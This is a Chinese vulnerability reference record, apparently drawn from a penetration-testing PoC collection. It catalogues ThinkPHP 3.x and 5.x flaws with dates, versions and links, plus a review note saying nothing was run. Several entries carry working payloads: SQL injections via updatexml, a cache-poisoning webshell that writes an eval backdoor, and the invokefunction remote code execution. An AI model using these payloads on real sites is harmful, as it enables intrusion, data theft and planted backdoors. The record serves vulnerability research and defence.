---
source: "Mr-xn/Penetration_Testing_POC"
product: "ThinkPHP / 多根因"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "ThinkPHP"
prerequisites: "来源所述条件，未列明部分仍待核：3.x、5.x逐漏洞日期及版本；短commit用于实验但未说明仓库及完整SHA"
side_effects: "未执行；本文需注意的操作影响：版本矩阵粗化；insert仅<5.0.16、order<=5.1.22，未给引入下限，容易覆盖其他分支"
source_status: "unknown"
id: "vw-8be36c11a9012d48b486b7f8"
entity_id: "ve-8be36c11a9012d48b486b7f8"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：3.x、5.x逐漏洞日期及版本；短commit用于实验但未说明仓库及完整SHA

代码与实验材料：完整多组测试控制器与payload，有多处“结果”空白，源码未运行

来源证据范围：多条先知/Seebug/官方话题链接，比纯速查可追溯

- **适用与权限边界（1）**：源码检出条件不明确；依据：git checkout 02f8e8a等只有短SHA，无仓库/完整标识，不可重建可重复环境。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **操作与副作用边界（2）**：版本矩阵粗化；依据：insert仅&lt;5.0.16、order&lt;=5.1.22，未给引入下限，容易覆盖其他分支。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **适用与权限边界（3）**：结果证据与缓存安全前提缺失；依据：多节结果空白；缓存getshell需web可达可执行、可控内容/路径等，不能只凭md5命名。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **证据待核（4）**：3.x/5.x缓存题目重复可统一链接；依据：同根因在两个栏目可做分支表，保留不同环境。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# ThinkPHP

## ThinkPHP 漏洞列表

### 一、3.x

>使用方法
>
>```bash
>cd /var/www/tp3
>```
>

#### ThinkPHP3.2.3_缓存函数设计缺陷可导致Getshell

| 标题     | ThinkPHP5.0.10-3.2.3缓存函数设计缺陷可导致Getshell |
| -------- | -------------------------------------------------- |
| 时间     | 2017-08-09                                         |
| 版本     | <= 3.2.3                                           |
| 文章链接 | <https://xz.aliyun.com/t/99>                       |


#### ThinkPHP3.2.3_最新版update注入漏洞

| 标题     | Thinkphp3.2.3最新版update注入漏洞         |
| -------- | ----------------------------------------- |
| 时间     | 2018-04-16                                |
| 版本     | <= 3.2.3                                  |
| 文章链接 | <https://www.anquanke.com/post/id/104847> |


#### ThinkPHP3.2.X_find_select_delete注入

| 标题     | thinkphp3.2 find_select_delete注入                           |
| -------- | ------------------------------------------------------------ |
| 时间     | 2018-08-23                                                   |
| 版本     | <= 3.2.3                                                     |
| 文章链接 | <https://xz.aliyun.com/t/2631><br /><https://xz.aliyun.com/t/2629> |

#### ThinkPHP3.X_order_by注入漏洞

| 标题     | ThinkPHP 3.X/5.X order by注入漏洞                   |
| -------- | --------------------------------------------------- |
| 时间     | 2018-08-29                                          |
| 版本     | <= 3.2.3                                            |
| 文章链接 | <https://mp.weixin.qq.com/s/jDvOif0OByWkUNLv0CAs7w> |


### 二、5.x

>使用方法
>
>```bash
>cd /var/www/tp5
>```
>

#### ThinkPHP5_SQL注入漏洞&&敏感信息泄露

| 标题     | ThinkPHP5 SQL注入漏洞 && 敏感信息泄露                        |
| -------- | ------------------------------------------------------------ |
| 时间     | 2017-07-03                                                   |
| 版本     | < 5.0.9                                                      |
| 文章链接 | https://xz.aliyun.com/t/125  <br /><https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html> |

>测试方法
>
>```bash
>git checkout 02f8e8a
>```
>
>测试代码
>
>```php
>public  function testsql()
>{
>   $ids = input('ids/a');
>   $result = db('user')->where('id', 'in', $ids)->select();
>   var_dump($result);
>}
>```
>
>POC
>
>```php
>testsql?ids[0,updatexml(0,concat(0xa,user()),0)]=1231
>```
>
>结果
>
>

#### ThinkPHP5.0.10-3.2.3_缓存函数设计缺陷可导致Getshell 

| 标题     | ThinkPHP5.0.10-3.2.3 缓存函数设计缺陷可导致Getshell |
| -------- | --------------------------------------------------- |
| 时间     | 2017-08-09                                          |
| 版本     | < 5.0.11                                            |
| 文章链接 | <https://xz.aliyun.com/t/99>                        |

  >测试方法
  >
  >```bash
  >git checkout 094dde5
  >```
  >
  >测试代码
  >
  >```php
  >public function add()
  >{
  >    $user = input('post.');
  >    $m=db('user')->where(['id'=> 1])->insert($user);
  >}
  >
  >public function cache()
  >{
  >    $m = db('user')->select();
  >    Cache::set('name',$m,3600);
  >}
  >```
  >
  >POC
  >
  >```php
  >post data:
  >    username=%2F%2F%0D%0A%24a%3Deval(%24_POST%5B%27a%27%5D)%3B%23
  >注：%2F%2F%0D%0A = //+回车
  >```
  >
  >结果
  >
  >
  >
  >
  >
  >
  >
  >其中文件路径和名称是 b0+68931cc450442b63f5b3d276ea4297 而
  >
  >md5('name') = b068931cc450442b63f5b3d276ea4297

#### ThinkPHP框架5.0.X_sql注入漏洞分析

| 标题     | ThinkPHP框架 5.0.x sql注入漏洞分析 |
| -------- | --------------------------------------------------- |
| 时间     | 2018-04-09                                          |
| 版本     | < 5.0.16                                            |
| 文章链接 | <https://xz.aliyun.com/t/2257>                        |

>测试方法
>
>```bash
>git checkout 7c13757
>```
>
>测试代码
>
>```php
>public  function testsql()
>    {
>        $username = input('get.username/a');
>        db('user')->where(['id'=> 1])->insert(['username'=>$username]);
>    }
>```
>
>POC
>
>```php
>testsql?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1
>```
>
>结果
>
>

#### ThinkPHP5.X_order_by注入漏洞

| 标题     | ThinkPHP 3.X/5.X order by注入漏洞                   |
| -------- | --------------------------------------------------- |
| 时间     | 2018-08-23                                          |
| 版本     | <= 5.1.22                                           |
| 文章链接 | <https://mp.weixin.qq.com/s/jDvOif0OByWkUNLv0CAs7w> |

>测试方法
>
>```bash
>git checkout 35e9878
>```
>
>测试代码
>
>```php
>public  function testsql()
>{
>   $order = input('get.order');
>   $m = db('user')->order($order)->find();
>   var_dump($m);
>}
>```
>
>POC
>
>```php
>testsql?order[id`|updatexml(1,concat(0x3a,user()),1)%23]=1
>```
>
>结果
>
>

#### ThinkPHP5.X_远程代码执行

| 标题     | ThinkPHP5.X 远程代码执行                                     |
| -------- | ------------------------------------------------------------ |
| 时间     | 2018-12-10                                                   |
| 版本     | 5.0.5-5.0.22<br />5.1.0-5.1.30                               |
| 文章链接 | <https://xz.aliyun.com/t/3570><br />https://paper.seebug.org/760/<br /><https://paper.seebug.org/770> |
>测试方法
>
>```bash
>git checkout 4fefa5e
>```
>
>测试代码
>
>```php
>public  function index()
>    {
>        //...无需实际代码
>     }
>    ```
>
>POC
>
>```php
>index?s=index/\think\container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
>```
>
>结果
>
>


---

> 来源：Mr-xn/Penetration_Testing_POC
